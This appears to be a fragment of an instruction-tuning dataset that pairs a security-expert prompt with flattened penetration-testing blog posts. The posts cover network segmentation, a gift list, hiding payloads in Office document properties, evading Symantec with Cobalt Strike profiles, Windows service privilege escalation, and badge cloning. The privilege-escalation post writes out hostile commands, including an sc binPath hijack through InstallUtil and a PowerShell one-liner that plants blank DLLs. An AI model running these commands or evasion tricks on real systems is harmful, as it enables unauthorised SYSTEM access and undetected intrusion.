SSID If your wireless router supports this mine didn't all this takes is a couple of minutes in your router's configuration to set up the new guest network Your consumer-grade router will hopefully take care of all the networking configuration behind the scenes to segregate the two networks You can even turn on Wireless Isolation mode which will prevent your guests devices from being able to communicate with each other on their network they will only be allowed to communicate with the internet This is definitely the easy button and won't let us understand the inner workings very well 2 Wireless Routers in Parallel This setup gets a little more complicated but it is basically two copies of the flat network setup It involves a separate wireless router for both the home network and guest network Each router has the default NAT DHCP and firewall configuration that would come with your typical consumer wireless router The two networks are then allowed out to the internet through a third router device It doesn't matter if this is wireless or not since you wouldn't be using the wireless capability in this scenario The networks are segmented because from the point of view of each of the wireless routers anything on the other side your third router is treated just like internet traffic There are a whole bunch of ways you can tweak this setup and it can start to get more complicated I won't go into any more details but my point is you could take some basic gear you find at rummage sales or have laying around plug it in and with very little configuration it will just work 3 Wireless Routers in Series What if you only have two wireless routers The diagram below shows a valid configuration as well but I prefer 2 above for a couple of reasons 1 The networks will not be properly segmented in this scenario and 2 the gateway for the home network is in the guest network This means that in the following diagram devices in the home network will be able to initiate communication with devices in the guest network but not vice versa You may be able to disable this if your router lets you add static routes but by default the routes will be there It also means that if a particularly nasty device got on your guest network it would have the possibility to Man-in-the-Middle your home network's gateway through an attack like ARP spoofing and inspect all your unencrypted traffic going to from the internet Affordable Options The consensus from what I've read is that you'll have much better results i.e network performance by using purpose-built devices over all-in-one devices What I mean by that is instead of the all-in-one consumer-grade wireless routers that we currently have you'd have one device for a firewall one for a router potentially multiple switches and multiple wireless access points more on that below Each new device will also increase the cost and complexity so we need to make sure we weigh the benefits against the costs before diving in Here are several options that I considered for my edge router Consumer Device Running DD-WRT or Open-WRT If you have a device that supports flashing open-source firmware such as DD-WRT or Open-WRT you could turn your consumer-grade device into something exponentially more configurable Personally I haven't had the greatest luck with either of these though some people swear by them True Enterprise Level Devices such as Cisco These are typically rack mount read big and not affordable new for a home network This is definitely a valid route to go if you have space and want to learn a marketable skill I hear that used Cisco devices can be quite affordable on eBay Enterprise Cisco gear will look like this Not this Enterprise Quality Devices at Consumer Prices You can buy something that has most of the configurability of the Cisco devices above but for the price of a consumer-grade router The two big contenders I've run across are Mikrotik and Ubiquiti My impressions are that Mikrotik devices are cheaper and don't hold your hand as much as Ubiquiti Ubiquiti devices are much sleeker looking both in their physical appearance and in the graphical interface Side note If Ubiquiti sounds more interesting to you I definitely recommend reading Troy Hunt's article I drool over the type of setup he ended up with but I didn't want to spend that kind of money and I didn't want to try and run ethernet cables through my walls ww.troyhunt.com ubiquiti-all-the-things-how-i-finally-fixed-my-dodgy-wifi rstechnica.com gadgets 2015 10 review-ubiquiti-unifi-made-me-realize-how-terrible-consumer-wi-fi-gear-is Build Your Own Router Firewall You can take almost any old computer you have lying around slap one of these free or open-source OS's on it and have something that performs better as a router firewall than most off the shelf products you can buy With this option you'll need to purchase a managed switch and a wireless card or access point separately I don't have any personal experience yet here so the suggestions below are purely based on my research fsense.org The de facto standard OS for a DIY firewall I would personally try OPNsense first before pfSense to see if it does what I need but that might just be my penchant to cheer for the underdog Again I don't have the first-hand experience with either software so feel free to choose the one that suits you best pnsense.org OPNsense is fully open source has a nice list of features and a spiffy looking web UI Originally this was a fork of pfSense but now they claim they have rewritten nearly all the original code I like that they seem to patch security issues and implement new features earlier than pfSense Like Pfsense it is also built on top of FreeBSD log.packetheader.net 2016 03 how-to-create-soho-router-using-ubuntu.html Joff Thyer has a writeup on how to get started by utilizing open source services on a Linux system to configure your own router This will definitely give you the most control out of any option but it's also likely going to take the most time unless you are a packet wizard-like Joff If you fall into that category why are you still reading this yos.io This is a Linux distribution that supplies a management interface for many great open-source tools Their website states Unlike OpenWRT or pfSense VyOS is more similar to traditional hardware routers This is going to be similar to the DIY Linux solution suggested by Joff but probably easier to use due to the central interface However everything is still done from the command line as VyOS lacks a GUI ww.sophos.com en-us products free-tools sophos-utm-home-edition.aspx On the other end of the DIY spectrum is Sophos UTM Unified Threat Management Home Edition While not open-source it is free It has a slick web UI but definitely looks more geared towards firewall and filtering services than low level routing Honorable Mention The latest craze these days has been whole home Wi-Fi and mesh networking systems These have always existed for the dedicated DIYer such as yourself but lately companies such as Google and Eero have created consumer kits that make the installation and setup dead simple This is certainly a great option for excellent Wi-Fi coverage without extra cabling but as these devices are meant to be used by a non-technical audience they don't meet my requirement that will allow segmenting wireless networks on different VLANs Terminology Up until this point I've been pretty liberal using terms like access point and router To discuss things further I'll have to be a little more careful with my terminology I've explained several terms below in my own words and purposely simplified some of the concepts because they aren't needed in what follows I'm sure my understanding is not perfect but it has worked well enough so far If I'm wrong on some major point please reach out and let me know Wireless Access Point AP This is simply the wireless base station that will send and receive signals with your wireless client device e.g phone tablet laptop The AP will then send the packets on to the wireless controller switch or router it's connected to Wireless APs will have a transmit power measured in milliWatts and antennas measured in dBi that determine their range Multiple APs can work together to host the same wireless signal and cover a larger area but these APs must be wired together using ethernet cables Hubs OSI layer 1 device think electrical wires Any packet received on any physical interface is sent to every other physical interface This means that if you have a system plugged into one interface you'll be receiving traffic from all other systems on the same hub regardless if the traffic is directed at you I won't be using a hub but I mention them to highlight the difference between a hub and a switch Switches OSI layer 2 device think MAC addresses that forwards packets between its different physical interfaces aka ports Unlike a hub a switch keeps an internal mapping between its ports and the MAC address associated It uses this knowledge to only forward packets to the correct ports rather than all ports Normally this mapping is automatically populated by the switch listening to the first packets sent from each port Routers OSI layer 3 device think IP addresses that keeps an internal routing table The routing table is where the router stores which subnets are available e.g 192.18.1.1 24 and which physical interface is the best to reach that subnet The routing table can be populated manually using static routes or automatically by communicating with other routers using routing protocols such as OSPF EIGRP RIP BGP and EGP When a packet comes into the router it consults the routing table to determine where to send the packet out again Firewalls OSI layer 3 device that inspects every incoming or outgoing packet and applies a set of rules that determine what action to take That's a pretty vague statement but it's because firewalls can be configured to do so many different things and operate on many different OSI layers Basically a firewall is configured with a series of rules that allow or deny traffic with certain characteristics The firewall uses the information contained within each packet along with information it has stored about recently seen packets in order to apply these rules Here are some examples Allow inbound traffic from certain IP addresses to pass Layer 3 Block traffic destined to specific TCP ports Layer 4 Allow inbound packets that correspond to an already established session Layer 3 Inspect HTTP traffic and block access to certain URLs Layer 7 Additional Information Reddit user monoman67 gives a succinct comparison between a router and a firewall A router is a layer 3 device used to allow LANs to communicate with each other A firewall is a layer 3-7 device used to limit traffic between LANs ww.reddit.com r networking comments 26aa04 whats_the_key_difference_between_a_firewall_and_a chp6k3f This article is a slightly longer but still accessible description of the differences between switches routers and firewalls evelopcents.com 2013 08 12 routers-switches-firewalls-differences Here's another article that does a little wider survey with an infosec flair if you're interested Oh and it's full of memes edium.com louiscremen 10-things-infosec-professionals-need-to-know-about-networking-d159946efc93 Those are the theoretical definitions or at least my take on them However things get confusing because the devices sold in stores often take on more than one of the roles described above For instance Layer 3 Switches These are switches remember think MAC addresses with layer 3 capabilities think IP addresses Essentially these are just routers They may not have all the capabilities normally associated with a router but for our purposes they function the same Routers with Hardware Switching I mention this because the Mikrotik device I'll be using has this feature Basically it boils down to speed In order to make routing decisions packets have to be sent to the CPU which takes time But by configuring a group of ports to function as a switch packets can be sent at wire speed fast You lose the benefits of routing by IP address but you have the ability to trade that for speed when your specific situation allows Enterprise Firewall Appliances These are most likely going to have routing capabilities It's possible to have a pure firewall that sits inline without routing but in order to be competitive in the market basic routing functionality is included This allows customers to buy one hardware device instead of two Consumer-Grade Wireless Routers These are the devices you find in most people's homes Each acts as a firewall router and switch The firewall functionality is there to protect you against attacks from the internet and is what keeps your devices from being compromised the moment you go online I'm not sure if these devices have true layer 2 switch functionality but for our purposes it doesn't matter In the next post I'll work through a way to determine how to group and segment your devices Read Part 2 here ww.blackhillsinfosec.com home-network-design-part-2 Credits Icons and diagrams are from yEd and Cisco ww.yworks.com products yed ww.cisco.com c en us about brand-center network-topology-icons.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>BHIS's 2nd Annual Infosecker's* Gift-List</title>\n<taxonomies>Fun & Games, christmas gifts, christmas gifts for nerds, gift guide, infosecker gift list</taxonomies>\n<creation_date>Mon, 27 Nov 2017 14:41:13 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sierra Ward with help from all Wow another year another Christmas and another chance to be totally stumped by what to get you favorite InfoSecker But fear not We are here with another riveting installment of the BHIS Christmas Gift Guide Our Tester Wish List This is divided by price point more than topically It's a mish-mash Wondering what was on the list last year Here that Stocking Stuffers Cyber Attribution Dice 10 different colors available ww.etsy.com listing 508651937 cyber-attribution-dice-set-pinkblack One of my favorite things on this list Remember that threat intelligence feed that John hates soooo much Well we found a better solution and way cheaper too and JUST as accurate Ethan said it reminded him of ww.bofhcalendar.com ah Blue Team we 3 you it was a rough year Screwdriver Pen 6 ww.amazon.com Maxcraft-60609-Precision-Pocket-Screwdriver dp B003BXS4T2 So handy so small so perfect for stockings YubiKey ww.yubico.com 20 50 Did you NOT read Beau and Mike's blog about hacking 2FA in Google Do you even Yubikey Brah Give them the gift of better security PowerShell Car charger 10 Brilliant hilarious and punny Sadly Amazon is out of stock but it can still be found on eBay Packet Squirrel ww.hak5.org gear packet-squirrel 60 Christmas is for toys what's better than hacking toys Really the testers say they'd love anything from Hak5 but the Packet Squirrel is new ya know so get to manning-in-the-middle all those networks RFID blocking sleeves 8 ww.etsy.com listing 237352364 rfid-blocking-sleeves-3x-passport-10x Jordan said Whoa These are very cool I've come to learn that everyone is very paranoid so playing to that hand with gifts is fitting Want something a little nicer See the Ridge wallet below Cable Organizer 16 because soooo many cords wires and cables ww.amazon.com BAGSMART-Organizer-Portable-Electronics-Accessories dp B01AU5YV40 Circuit board tie clip 17 You may not wear a tie every day or any day but when you do you can let your nerd shine through ww.etsy.com listing 255124041 short-tie-bar-for-a-skinny-tie-circuit And apparently Beau really REALLY has a death wish because he's requesting this for the second year in a row Death Wish Coffee ww.deathwishcoffee.com Gifts 50 Globe Ice Cube Molds 9 ww.amazon.com dp B00KI7QZ5Y BB asked how you get the ice so clear answer you boil it first Seems weird but it helps get all those teensy air bubbles out before freezing Solar battery packs you know for when the power grid is hacked These range in price this one is only 17 ww.amazon.com FLOUREON-Waterproof-Cellphones-Flashlight-Emergency dp B073XD2GJT ref sr_1_4?s wireless ie UTF8 qid 1511380314 sr 1-4 keywords solar power charger Pocket wireless filehub thingy RAVPower FileHub Plus Wireless Travel Router SD Card Reader USB Portable Hard Drive Companion DLNA NAS Sharing Media Streamer 6000mAh External Battery Pack to be exact 40 from Amazon ww.amazon.com RAVPower-Wireless-Portable-Companion-Streamer dp B016ZWS9ZE ref sr_1_1?s electronics ie UTF8 qid 1510798768 sr 1-1 keywords rav power wireless filehub That title though I feel like I'm describing my Red Rider b.b gun to Santa and I can't even take a breath the title feature list is so long Mouse with a spider inside 23 Just to be clear this is NOT my idea of a good time But apparently people like Jordan think it's hilarious and also awesome ww.amazon.com gp aw d B002UG1PZ6 ref mp_s_a_1_3?ie UTF8 qid 1510674187 sr 8-3\u03c0 AC_SX236_SY340_FMwebp_QL65 keywords spider mouse BB echoed my sentiments with this thought What the why do you hate us Jordan To which Jordan replied Seriously how do you not love this And Ethan replied with Yes Ethan that IS What my desk would look like if I found that spider alive anywhere in my house Looking for a gift for new parents Baby onesie 16 ww.etsy.com listing 277968952 living-proof-that-nerds-get-laid-funny Arduino Uno 3 Ultimate Starter Kit Includes 12 Circuit Learning Guide 45 ww.amazon.com gp aw d B00BT0NDB8 this really does look fun Retro inspired keyboard 26 These appear to be all the rage with millennialals these days All of the jazzy old-fashionedness without the inability to delete ww.amazon.com Mechanical-Keyboard-Steampunk-Magicforce-Qisan dp B01MQITHLV ref sr_1_2_sspa?s electronics ie UTF8 qid 1511383675 sr 1-2-spons keywords retro keyboard psc 1 Jackknife lock picks 40 recommended by our keenest lock picker Kelsey Ethan also added I learned to pick with one similar to this and still have one ww.southord.com Lock-Pick-Tools Jackknife-Pocket-Lock-Pick-Sets.html Rick Morty Things because everybody loves Rick and Morty though the marketing dept has never really understood why Out shopping the other day I saw tons of figurines and sets in the toy department also is this REALLY a kids show so perhaps any of those But why not the official coloring book 11 must be an Amazon best-seller for a reason InfoSec is stressful coloring helps ww.amazon.com Rick-Morty-Official-Coloring-Book dp 1785655620 If you're looking for something less creepy than the spider mouse look no further than this color changing glowing water droplet And it has a face so it also looks friendly Nightlight 13 ww.amazon.com dp B01MRSTKD1 Or maybe you DO want it to be creepy Ethan suggests pairing it with the spider mouse and with the help of some of the other toys having it make creepy sounds as well as change colors Hmmm ideas abound Death Star Waffle Maker 40 Nothing says Christmas morning or for that matter breakfast like a death star waffle ww.thinkgeek.com product huik What would Christmas be without games I mean real games here not kits to solder stuff What Do you Meme 30 looks like Cards Against Humanity or Apples to Apples but with memes Maybe it's just my marketing love for funny gifs sooo many gifs Either way I've added it to my own wish list ww.amazon.com What-Meme-Adult-Party-Game dp B01MRG7T0D Gifts 50 100 Mikrotik portable router for when you need to connect all the things with wires .co 1GRAt2e 60 Magnetic card stripe writer 70 More fun and games all Christmas vacation long ww.amazon.com Deftun-MSR605X-Magnetic-Stripe-Encoder dp B01DUCCEWQ ref sr_1_1?ie UTF8 qid 1510798271 sr 8-1 keywords magnetic stripe writing Remember how I said Id never met anybody in this industry that wasn't crazy paranoid If you want something a little nicer than just the disposable sleeves how about an RFID blocking wallet And not just any wallet but also a stylish wallet 65 from The Ridge ww.ridgewallet.com I'm digging this rose gold one other colors available Gifts From 100 Pocket Firewall tore.netgate.com SG-1000.aspx It's 3 x 2 x 1 it comes in red aluminum and it's got a TI ARM Cortex-A8 AM3352 CPU at 600 MHz including crypto accelerator which is definitely something you want in your pocket Glyph 1TB SSD external drive Ethan says I love this thing It's tiny and I can run VMs off of it 400 ww.amazon.com Glyph-Atom-USB-C-Compatible-Thunderbolt dp B00Z14U406 Ethan suggests bluetooth headphones I have both ear buds and can headphones It's so nice not to constantly catch the cord on everything Hey nobody said just because we work in tech we're early adopters Bose Noise Canceling Headphones 330 Christmas is a time to give gifts that nobody NEEDS but everybody wants These are especially great for the person in your life who travels all the time so luxurious ww.amazon.com Bose-QuietComfort-Wireless-Headphones-Cancelling dp B01E3SNO1G Too fancy for your blood Costco has a Sony version for 200 and a generous return policy But you probably wont be returning ww.costco.com Sony-MDR100ABN-Bluetooth-Noise-Canceling-Headphones.product.100381422.html __________________________________________ Thoughts from BB King I'm calling it 2018 will the the Year of Linux on the Des w w w w Software Defined Radio Information is getting easier to find did you hear about the SDR labs at WWHF and new hardware is getting more affordable Start with some study The Field Expedient SDR books are a great introduction in three small volumes ww.fieldxp.com home If you need a first SDR receiver pick up this RTL-SDR kit for 26 This one is receive-only but you should spend a lot of time receiving before you transmit anyhow Don't hose up the spectrum until you know what you're doing ww.rtl-sdr.com buy-rtl-sdr-dvb-t-dongles Skip a night out and spend the savings on this Then skip more nights out and play with your new toy You'd rather stay in anyway right But here's why it's the year of SDR the LimeSDR Mini ships on 12 31 2017 The Mini compares favorably with the HackRF One on most not all tech specs and it's only 130 vs 300 for the HackRF One It's tiny and promises some capabilities that normally cost a lot more ww.crowdsupply.com lime-micro limesdr-mini ___________________________________________ Well there you have it kids Stay safe out there on this Cyber Monday And happy shopping This is not a sponsored post and although we probably should get some pennies kicked our way from them none of those links are affiliated Cause you know I may be in marketing but I try not to be too skeezy You're welcome and HAPPY HOLIDAYS"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hide Payload in MS Office Document Properties</title>\n<taxonomies>Red Team, Red Team Tools, how to hide payload in MS docs, Malware, Microsoft, MS Word, pen-testing, penetration testing, pentest, Pentesting, Pentesting tips and tricks, PowerShell, PowerShell Scripts, Word</taxonomies>\n<creation_date>Wed, 29 Nov 2017 14:40:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Can you think of a reason why you might want to put a lengthy comment into the properties of an MS Office document If you can then you might like this PowerShell script that will put a comment of any length into this field you Microsoft limits the length of comments that can be inserted when using the application e.g Word Excel PowerPoint but this script gets you past that limitation The animation below shows the script in action The script also includes a Sanitize option that will clear out the values for the Author and Last Modified By document properties in case you don't want to share that information Or you can use additional command line parameters to set specific values as shown in the demo To read the comment value out using a Macro use this for MS Word Dim prop As DocumentProperty For Each prop In ActiveDocument.BuiltInDocumentProperties If prop.Name Comments Then MsgBox prop.Value End If Next Or for MS Excel just change ActiveDocument to ActiveWorkbook Dim prop As DocumentProperty For Each prop In ActiveWorkbook.BuiltinDocumentProperties If prop.Name Comments Then MsgBox prop.Value End If Next And for PowerPoint You guessed it Dim prop As DocumentProperty For Each prop In ActivePresentation.BuiltInDocumentProperties If prop.Name Comments Then MsgBox prop.Value End If Next Maybe you would like to enter your comment as a base64 encoded string and decode it within the macro This vbscript code will do the trick I hope that this has been a helpful post and you find the script useful Until next time _______ Carrie was previously a BHIS tester until she transferred to another great company But we're super happy to have her many awesome informative guest posts"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Morning with Cobalt Strike & Symantec</title>\n<taxonomies>Author, C2, Joff Thyer, Red Team, anti-virus, AV software, C2, easy button, pen-testing, penetration testing, pentest, Pentesting, Symantec, There is NO easy button</taxonomies>\n<creation_date>Mon, 04 Dec 2017 15:28:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer If you have been penetration testing a while you likely have ended up in a Red Team situation or will be engaged in it soon enough From a command channel perspective the work that Raphael Mudge has put into Cobalt Strike makes it an attractive platform for teamwork Unlike traditional methods of using things like Linux screen with PowerShell Empire and or Metasploit Cobalt Strike allows for the setup of an operational attack infrastructure that further promotes real threat emulation possibilities One of the Black Hills friends in the community Lee Kagan contributed an excellent blog post which you can find at ww.blackhillsinfosec.com build-c2-infrastructure-digital-ocean-part-1 detailing how to go about setting up Cobalt Strike with a threat emulation profile Part 2 is forthcoming he promises As a part of that post it includes a link to a shell script that automates a portion of the setup such that the proper Cobalt Strike profile is created This can be found from KillSwitch's GitHub repository ithub.com killswitch-GUI CobaltStrike-ToolKit blob master HTTPsC2DoneRight.sh On some recent Red Team activities I leveraged all of the above information with some nice custom domains and my own unique DNS name server infrastructure all running within virtual machines at Digital Ocean This allowed me to create an operational infrastructure that could properly provide either DNS HTTP or HTTPS command channels via an appropriately matured domain name with full threat emulation of Amazon-like web traffic All of this using virtual systems with IP addresses not easily attributed back to myself I was feeling pretty good about this and I set out on my adventure to deliver C2 payloads into the customer network Now in this case the customer was actually happy to run some things for me thus removing the social engineering aspect of the test My natural inclination was to jump towards PowerShell and or executable content though I did need to be cognizant of endpoint protection solutions Some initial attempts at using executable content revealed that Symantec endpoint protection was at play and that certain things would fire a signature on the endpoint Symantec and others have evolved some interesting changes in feature sets over time some of which are effective and some not so much I do maintain a subscription to the non-enterprise consumer version of Symantec so I moved into research mode a while In terms of Symantec endpoint protection features I mostly encounter the following obstacles during pentesting Endpoint host-based intrusion prevention HIPS Signature-based protection for executable content on disk Signature-based protection that appears to leverage the application compatibility toolkit ACT shim during the process creation pipeline Memory-based detection of shellcode Given this knowledge and the goal of proper threat emulation I decided to set up three different scenarios with Cobalt Strike for some advance testing of Symantec endpoint protection responses In these scenarios I deliberately avoided both DLL EXE content and any TLS channels I wanted to focus on the HIPS and memory-based detection functionality of the defenses Cobalt Strike team server with no custom HTTP HTTPS profile and a listener on port 80 using HTTP Cobalt Strike team server with an Amazon web server profile generated by the HTTPSC2DoneRight.sh script and using an HTTP listener Cobalt Strike team server with a customized version of the Amazon HTTP listener profile The version of the Symantec software I was using for this test is shown in the following screenshots Yes it was fully up to date as of today All payloads for the above scenarios were generated as PowerShell commands from Cobalt Strike and pasted into a command shell on a test system Cobalt Strike has either a 32-bit based shellcode or 64-bit based shellcode which can be generated 32-bit payload generates IPS Alert The first discovery was that regardless of the server-side listener configuration the 32-bit payloads would always generate an IPS alert and be blocked before any traffic reached the server An example alert is shown above 64-bit payload results in success In the case of 64-bit payloads a successful command channel session is established to the Cobalt Strike team server in two of the above use cases No specific custom profile at all with HTTP listener Highly customized profile with HTTP listener The strangest case was the second scenario in which the HTTPSC2DoneRight.sh script was used to generate the Amazon-like profile In this case with a 64-bit payload I observed that the second binary stage of payload was delivered just fine After that delivery comes to the initial HTTP GET request The Amazon-like script above generates a GET REQUEST as follows GET s ref nb_sb_noss_1 167-3294888-0262949 field-keywords books What is completely bizarre is that the C2 Channel back to Cobalt Strike is NOT ESTABLISHED but furthermore there is absolutely no output or feedback of malicious activity on the client workstation I decided to break out the packet sniffer and noted the payload delivery observation of the second stage and then saw that connection requests were being immediately torn down with a TCP RESET when the client-side attempted the GET request above Four separate retries from the client workstation each with five-second wait between retrying Excerpt from the amazon.Profile file on Cobalt Strike Team Server So then I decided to break out the sniffer for the same profile on the team server but on a client system with no Symantec endpoint protection installed Sure enough as the below screenshot from Wireshark shows the traffic went right on through as expected Captured C2 Channel GET Request from Non-Symantec Installed System It becomes abundantly clear to me that the Symantec HIPS was blocking and resetting the TCP connection whenever the TCP stack attempted to transmit the above GET request and that this must be a specific signature written to match the scripted Amazon profile Ever so slightly modified profile Naturally I decided to make a small change on the team server profile which replaced the original sequence of digits in the GET request with all 8's instead Note that this is a really minor change that would not even circumvent a well constructed regular expression and or IPS signature with multiple matching criteria I changed not a single other parameter for this test Other parameters that could be dead giveaways included the host header and certainly some fixed cookie values The result Yes you guessed right one happy C2 session established Established C2 Session In conclusion while I think that endpoint protection suites are getting better in general there is still a lot of work to be done for custom malware activity In performing this testing work I surmised that in a Symantec endpoint protection context 64-bit shellcode delivered into memory with typical injection techniques still has a good chance of success The HIPS functionality does not seem to inspect second stage shellcode delivery at all Writing a specific HIPS signature in response to a widely published penetration tester threat modeling technique seems quite arbitrary but moreover is not an effective defense Not informing the end-user of potential malicious activity is a false negative Frankly there is nothing worse than not knowing The lesson learned for penetration testers here is to not fall into the trap of trying to press the Easy Button I know we are often in a hurry to get things done but using canned scripts on the internet will end up getting you blocked in some form or another This is clearly the case even if the canned script is well-intended threat modeling Always review and validate what you are about to do Happy hunting folks"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Digging Deeper into Vulnerable Windows Services</title>\n<taxonomies>Author, Brian Fehrman, External/Internal, Red Team, Application Whitelisting, escalated, penetration testing, Pentesting, privilege escalation, whitelisting, Windows, Windows Privilege Escalation</taxonomies>\n<creation_date>Wed, 06 Dec 2017 15:05:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman Privilege escalation is a common goal for threat actors after they have compromised a system Having elevated permissions can allow for tasks such as extracting local password-hashes dumping clear text credentials from memory and installing persistent back doors on the system Insecurely-configured Windows Services can be one avenue for privilege escalation Windows Services typically run under the context of an elevated user If you can get the service to run your malicious program your program will likely run with elevated permissions This blog post discusses two obstacles that might arise when attempting to exploit Windows Services Local Windows Privilege-Escalation via Insecure Service with Application Whitelisting Present In this section we briefly discuss a scenario with the following conditions You have command-line access to a Windows system You are an unprivileged user You have permissions to overwrite a privileged service You either have permissions to stop restart the vulnerable service mentioned in 3 or you are able to stop it with another method such as using blank DLL files to crash the service You can restart the system Application whitelisting is enabled on the system In other words you've run PowerUp or another local-privilege escalation script you see a service is vulnerable you can easily overwrite it but your malicious binary won't run because application whitelisting AWS is preventing it from executing What to do Well we can turn to some of the nifty AWS bypass techniques that have been disclosed by Casey Smith and others InstallUtil is a great one since the template is fairly small you can easily customize your program to perform whatever privileged-task you'd like e.g add a user and make them local admin establish a C2 connection as SYSTEM etc C is fun to write and can be compiled locally and many other great benefits In this example we have code that was written to Create a new local user Add the new user to the local Administrators group Make another call to InstallUtil that runs a second custom C program that calls out to a remote server and establishes a Meterpreter C2 session Run via InstallUtil The code can be compiled using the csc.exe C compilation tool that is typically present on Windows systems and is usually trusted by AWS Let's say your code is located at C Users Public runthis.cs the following command can likely be used to compile the program C Windows Microsoft.NET Framework v2.0.50727 csc.exe platform anycpu out C Users Public shell.exe C Users Public runthis.cs How do we get this to work with the service though Easy If you have written permissions for the service you likely have permissions to reconfigure certain properties of the service as your normal Windows Service-Config tool called sc can be used to tell the vulnerable service which binary it should run by configuring the service's binPath property The binPath property not only points to the binary but it also allows you to specify command-line arguments just as you would if you called it directly from the command line Let's say that the service is named ExploitThisService and your binary is located at C Users Public shell.exe as given by the compilation command above then you could use the following service-config command sc config ExploitThisService binPath C Windows Microsoft.NET Framework v2.0.50727 InstallUtil.exe logfile C Users Public logfile.txt LogToConsole false U C Users Public shell.exe That's it Restart the computer and voila your executable should run under the same privileged context that the vulnerable service was running Local Windows Privilege-Escalation via Insecure Service without Stop Restart Permissions Let's consider another scenario that is similar to the first section of this write-up In this scenario however let's assume that you do not have the ability to stop or restart the service This missing permission is actually quite common Without being able to stop the service you won't be able to overwrite the executable and may not be able to update the configuration What do we do in that case One possibility is to take advantage of the way that programs search for DLLs that they need to load upon execution DLL hijacking is nothing new The concept is that you overwrite a DLL that is required by a program with your own malicious DLL The program runs calls your DLL and your code is executed That isn't what we are talking about here though In this case we are going to use DLLs to crash the service so that we can overwrite it A design decision made by Windows dictates that by default programs will first look in their current folder for any necessary DLLs Hardcore Windows people please correct me if I am wrong with the following statement all Windows programs will require at least one DLL from the C Windows System32 folder if it is not included with the program Obviously that folder path is used in a general sense and I am sure people will troll me on the fact that it can be changed but you get the idea So how do we take advantage of this Easy Have you ever tried to run a program and were greeted with an angry-looking message that said it couldn't find a required DLL Probably What would happen if the program could find the DLL but the DLL was corrupted Or if the DLL was just a blank file Queue Light Bulb Graphic Let's assume that the vulnerable service is located in the folder C VulnService The following PowerShell one-liner will parse the C Windows System32 directory grab the names of all of the DLLs create blank files with the same names and place them in C VulnService directory dir C Windows System32 -filter .dll select-object Name foreach-object str C VulnService _.name New-Item -type file str Now restart the system and boom The service should crash and you should now be able to overwrite it with a malicious binary of your choosing or update the service config to utilize the AWS bypass method mentioned in the previous section Don't forget to remove the blank DLLs from the folder before attempting to run your binary or it might end up in the same grave as the vulnerable service You probably noticed that this is a lot of DLLs to copy over and you likely don't need all of them You're right We are currently narrowing down a list of commonly-required DLLs by running random programs and using DLL inspection tools to determine which DLLs are loaded There are some lists out there of commonly-used DLLs and we've got ours narrowed down to about 15 or so It will be released once we are satisfied or we've grown bored of running random programs We will point out that we mentioned the DLL search behavior is default this doesn't mean it can't be changed You can change the DLL search behavior by referring to some of the methods in this article that was released by Microsoft sdn.microsoft.com en-us library windows desktop ms682586 v vs.85 .aspx"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Performing a Physical Pentest? Bring This!</title>\n<taxonomies>Author, Jordan Drysdale, Physical, Red Team, Badgy, Jordan Drysdale, pen-testing, penetration testing, pentest, Pentesting, Physical Pentest</taxonomies>\n<creation_date>Wed, 13 Dec 2017 16:12:04 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Physical Pentest Upcoming Bring a Badgy While badge reproduction may not be the intended use of this product if you are a physical tester and you don't own one you need to get one ww.badgy.com products badgy-200.html While stuffing this thing in my suitcase was the obvious choice maybe in the future I'll avoid the TSA's standard loveletter and just ship it During an onsite and depending on the time constructs wandering around outside customer facilities can often lead to an information disclosure situation that is rarely protected by steadfast data controls If you can identify a badge the next part is easy duplicate it This product had no trouble mapping over USB direct to a VM From there Evolis Studio allowed us to iterate through badge variations until we were satisfied ww.badgy.com download evolis-badge-studio.html This page requires things but not attributable things or monetary exchange While I'm not going to display the front we came up with here's the back Don't forget to match the target environment with these badges and a tie we were essentially ignored even with our antennae Rubber Duckys Bash Bunnys and lock picks in full upright and locked positions"
    },
    {
        "input": "",
